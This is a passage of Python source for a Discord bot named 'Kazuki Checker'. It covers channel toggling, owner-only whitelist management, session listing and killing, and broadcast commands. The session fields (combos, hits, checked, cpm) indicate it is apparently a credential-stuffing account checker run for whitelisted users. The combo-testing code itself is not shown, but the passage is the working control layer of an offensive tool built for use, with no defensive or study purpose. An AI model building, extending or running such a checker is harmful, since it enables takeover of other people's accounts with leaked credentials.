    if isinstance(ctx.channel, discord.DMChannel):
        await ctx.send("❌ Can only toggle in server channels."); return

    ch_id = ctx.channel.id
    if action is None:
        # Show current state
        state = "✅ Enabled" if is_enabled_channel(ch_id) else "❌ Disabled"
        await ctx.send(f"Kazuki Checker in <#{ch_id}>: **{state}**\nUse `xtoggle on` or `xtoggle off`")
        return

    if action.lower() in ("on", "enable", "true", "1"):
        toggle_channel(ch_id, True)
        await ctx.send(f"✅ Kazuki Checker **enabled** in <#{ch_id}>\nWhitelisted users can now use all commands here.")
    elif action.lower() in ("off", "disable", "false", "0"):
        toggle_channel(ch_id, False)
        await ctx.send(f"❌ Kazuki Checker **disabled** in <#{ch_id}>")
    else:
        await ctx.send("Usage: `xtoggle on` / `xtoggle off`")

@bot.command(name="channels")
async def cmd_channels(ctx):
    """List all channels where bot is enabled. Owner only."""
    if not is_owner(ctx.author.id): await ctx.send("❌ Owner only."); return
    lst = bot_data.get("enabled_channels", [])
    if not lst: await ctx.send("No channels enabled."); return
    lines = []
    for ch_id in lst:
        ch = bot.get_channel(int(ch_id))
        if ch: lines.append(f"✅ <#{ch_id}> (`{ch.guild.name}` → `{ch.name}`)")
        else:  lines.append(f"✅ `{ch_id}` (unknown channel)")
    layout = ui.LayoutView()
    container = ui.Container(accent_color=discord.Colour.from_rgb(170, 0, 255))
    container.add_item(ui.TextDisplay("# 📡 Enabled Channels"))
    container.add_item(ui.Separator())
    container.add_item(ui.TextDisplay("\n".join(lines) or "None"))
    layout.add_item(container)
    await ctx.send(view=layout)

@bot.command(name="help")
async def cmd_help(ctx):
    if not is_wl(ctx.author.id): await ctx.send("❌ Not whitelisted."); return
    await show_help(ctx.channel, ctx.author)

# ── Owner ────────────────────────────────────────────────────────────────────

@bot.command(name="wl")
async def cmd_wl(ctx, action=None, user_id:str=None):
    if not is_owner(ctx.author.id): await ctx.send("❌ Owner only."); return
    uid = None
    if user_id:
        try: uid = int(user_id.strip("<@!>"))
        except: await ctx.send("❌ Invalid user ID or mention."); return

    if action=="add" and uid:
        if uid not in bot_data["whitelist"]: bot_data["whitelist"].append(uid); save_data(bot_data)
        await ctx.send(f"✅ `{uid}` whitelisted.")
    elif action=="remove" and uid:
        if uid in bot_data["whitelist"]: bot_data["whitelist"].remove(uid); save_data(bot_data)
        await ctx.send(f"✅ `{uid}` removed.")
    elif action=="list":
        wl=bot_data.get("whitelist",[])
        await ctx.send(f"📋 Whitelist ({len(wl)}):\n"+("\n".join(f"`{x}`" for x in wl) or "Empty"))
    else: await ctx.send("Usage: `xwl add/remove/list <id or @user>`")

@bot.command(name="killall")
async def cmd_killall(ctx):
    if not is_owner(ctx.author.id): await ctx.send("❌ Owner only."); return
    n=0
    for s in active_sessions.values(): s.running=False; n+=1
    await ctx.send(f"🛑 Killed `{n}` session(s).")

@bot.command(name="kick")
async def cmd_kick(ctx, user_id:str=None):
    if not is_owner(ctx.author.id): await ctx.send("❌ Owner only."); return
    uid = None
    if user_id:
        try: uid = int(user_id.strip("<@!>"))
        except: await ctx.send("❌ Invalid user ID or mention."); return
    if not uid: await ctx.send("Usage: `xkick <id or @user>`"); return

    s=active_sessions.get(uid)
    if s: s.running=False; await ctx.send(f"🛑 Killed `{uid}`.")
    else: await ctx.send("No session found.")

@bot.command(name="sessions")
async def cmd_sessions(ctx):
    if not is_owner(ctx.author.id): await ctx.send("❌ Owner only."); return
    if not active_sessions: await ctx.send("No active sessions."); return
    lines=[f"`{uid}` sid=`{s.session_id}` {s.C['checked']}/{len(s.combos)} hits={s.C['hits']} cpm={s.cpm()}"
           for uid,s in active_sessions.items()]
    await ctx.send("**Sessions:**\n"+"\n".join(lines))

@bot.command(name="broadcast")
async def cmd_broadcast(ctx, *, msg=None):
    if not is_owner(ctx.author.id): await ctx.send("❌ Owner only."); return
    if not msg: await ctx.send("Usage: `xbroadcast <msg>`"); return
    sent=0
    for uid in bot_data.get("whitelist",[]):
        try: u=await bot.fetch_user(uid); await u.send(f"📢 **Owner:** {msg}"); sent+=1
        except: pass
    await ctx.send(f"✅ Sent to `{sent}`.")

if TOKEN is None or TOKEN == "" or TOKEN == "YOUR_BOT_TOKEN_HERE":
    print("Error: DISCORD_TOKEN is missing in environment variables!")
else:
    bot.run(TOKEN)
